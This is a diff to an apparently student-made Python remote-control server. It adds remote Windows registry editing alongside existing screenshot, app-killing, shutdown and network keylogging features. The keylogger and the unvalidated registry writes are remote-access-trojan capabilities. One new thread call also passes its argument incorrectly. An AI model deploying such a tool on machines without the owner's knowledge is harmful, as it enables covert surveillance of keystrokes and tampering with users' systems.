@@ -3,10 +3,13 @@ import threading
 import pyautogui
 import io
 import os
-import winreg
+import winreg as wr
 from pynput import keyboard
 import subprocess
 import re
+# from .. import functions
+# from functions import *
+# from functions import regedit
 
 HEADER = 64
 PORT = 5050
@@ -41,6 +44,114 @@ def receive(connection):
         return msg
     return ""
 
+def getValue(path, value_name):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        value = wr.QueryValueEx(key, value_name)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return value
+    except:
+        return False
+    
+def setValue(path, value_name, dataType, data):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        wr.SetValueEx(key, value_name, 0, dataType, data)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return True
+    except:
+        return False
+    
+def createValue(path, value_name, dataType, data):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        wr.SetValueEx(key, value_name, 0, dataType, data)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return True
+    except:
+        return False
+    
+def deleteValue(path, value_name):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        wr.DeleteValue(key, value_name)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return True
+    except:
+        return False
+
+def createKey(path, newkey):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        wr.CreateKey(key, newkey)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return True
+    except:
+        return False
+  
+def deleteKey(path, delKey):
+    try:
+        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
+        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
+        wr.DeleteKey(key, delKey)
+        wr.CloseKey(key)
+        wr.CloseKey(reg)
+        return True
+    except:
+        return False
+
+def analyzeRegistry(msg):
+    content = msg.split(',')
+    print(content)
+    if content[0] == 'GETVAL':
+        returnVal = getValue(content[1], content[2])
+        if returnVal:
+            return f'The value at path {content[1]} is {returnVal}'
+        else: 
+            return f'Cannot get value at path {content[1]}'
+    elif content[0] == 'SETVAL':
+        returnVal = setValue(content[1], content[2], content[3], content[4])
+        if returnVal:
+            return f'Value {content[2]} has been set to {content[4]}'
+        else:
+            return f'Error while setting value {content[2]}'
+    elif content[0] == 'CREATEVAL':
+        returnVal = createValue(content[1], content[2], content[3], content[4])
+        if returnVal:
+            return f'Created value {content[2]}'
+        else:
+            return f'Error while creating value {content[2]}'
+    elif content[0] == 'DELETEVAL':
+        returnVal = deleteValue(content[1], content[2])
+        if returnVal:
+            return f'Deleted value {content[2]}'
+        else:
+            return f'Error while deleting value {content[2]}'
+    elif content[0] == 'CREATEKEY':
+        returnVal = createKey(content[1], content[2])
+        if returnVal:
+            return f'Created key {content[2]}'
+        else:
+            return f'Error while creating key {content[2]}'
+    elif content[0] == 'DELETEKEY':
+        returnVal = deleteKey(content[1], content[2])
+        if returnVal:
+            return f'Deleted key {content[2]}'
+        else:
+            return f'Error while deleting key {content[2]}'
+    else:
+        return 'Invalid command'
+
 def sendScreenShot(connection, address):
     print(f"[{address}] !SCREENSHOT")
     screenshot = pyautogui.screenshot()
@@ -50,7 +161,7 @@ def sendScreenShot(connection, address):
     connection.send(str(len(screenshotByte)).encode('utf-8').ljust(64))
     connection.sendall(screenshotByte)
 
-def record_keys(connection, address):
+def record_keys(connection):
     keys_pressed = []
 
     def on_press(key):
@@ -77,7 +188,7 @@ def getAppList():
     
     for line in proc.stdout.splitlines():
         line = line.strip()
-        print(line)
+        # print(line)
         pattern = r'(.+?)\s+(\d+)\s+(.+)\s+(\d+)'
         match = re.match(pattern, line)
         if line:
@@ -119,35 +230,35 @@ def sendAppList(connection):
 def handle_client(connection, address):
     print(f"New connection initialized - {address}.")
     while True:
-        msg_len = connection.recv(HEADER).decode(FORMAT)
-        if msg_len:
-            msg_len = int(msg_len)
-            msg = connection.recv(msg_len).decode(FORMAT)
-            if msg == DISCONNECT_MSG:
-                print(f"[{address}] - Connection closed")
-                break
-            elif msg == GETAPP_MSG:
-                sendAppList(connection)
-            elif msg == KILLAPP_MSG:
-                app_id = receive(connection)
-                killApp(app_id, connection)
-            elif msg == SCREENSHOT_MSG:
-                sendScreenShot(connection, address)
-            elif msg == SHUTDOWN_MSG:
-                os.system("shutdown /s /t 1")
-            elif msg == REGISTRY_MSG:
-                pass
-            elif msg == KEYLOG_MSG:
-                global keylogger_on
-                if (not keylogger_on):
-                    print(f"[{address}] - KEYLOG START")
-                    keylogger_on = True
-                    threading.Thread(target=record_keys, args=(connection, address)).start()
-                else:
-                    print(f"[{address}] - KEYLOG END")
-                    keylogger_on = False
+        msg = receive(connection)
+        if msg == DISCONNECT_MSG:
+            print(f"[{address}] - Connection closed")
+            break
+        elif msg == GETAPP_MSG:
+            sendAppList(connection)
+        elif msg == KILLAPP_MSG:
+            app_id = receive(connection)
+            killApp(app_id, connection)
+        elif msg == SCREENSHOT_MSG:
+            sendScreenShot(connection, address)
+        elif msg == SHUTDOWN_MSG:
+            os.system("shutdown /s /t 1")
+        elif msg == REGISTRY_MSG:
+            command = receive(connection)
+            print(command)
+            result = analyzeRegistry(command)
+            send(connection, result)
+        elif msg == KEYLOG_MSG:
+            global keylogger_on
+            if (not keylogger_on):
+                print(f"[{address}] - KEYLOG START")
+                keylogger_on = True
+                threading.Thread(target=record_keys, args=(connection)).start()
             else:
-                print(f"[{address}] {msg}")
+                print(f"[{address}] - KEYLOG END")
+                keylogger_on = False
+        else:
+            print(f"[{address}] {msg}")
     print()
     connection.close()
 
